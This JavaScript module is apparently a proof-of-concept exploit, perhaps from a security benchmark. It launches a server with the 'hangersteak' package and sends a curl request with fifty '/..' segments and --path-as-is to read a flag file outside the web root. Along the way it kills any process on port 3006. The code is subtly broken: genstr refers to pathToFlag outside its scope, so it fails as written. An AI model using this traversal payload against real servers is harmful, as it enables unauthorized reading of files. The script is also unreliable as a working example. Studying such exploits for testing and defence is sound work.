function exploitFunction(payload) {
  const { pathToFlag } = payload;

  const http = require("http");
  const hangersteak = require("hangersteak");
  const fs = require("fs");
  const { exec } = require("child_process");

  try {
    fs.readFileSync(pathToFlag).toString();
    exec("fuser -k 3006/tcp", () => {});
  } catch (e) {}

  const server = http.createServer((req, res) => {
    hangersteak(req, res);
  });

  server.listen(3006, () => {
    console.log("Server started on port 3006");
  });

  let attack_string = `curl -v --path-as-is "http://localhost:3006${genstr(50)}"`;
  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error executing command: ${error}`);
    } else {
      console.log(`Output: ${stdout}`);
    }
    server.close(() => {
      console.log("Server closed");
      process.exit();
    });
  });
}

function genstr(n) {
  return "/..".repeat(n) + pathToFlag;
}

module.exports = { exploitFunction };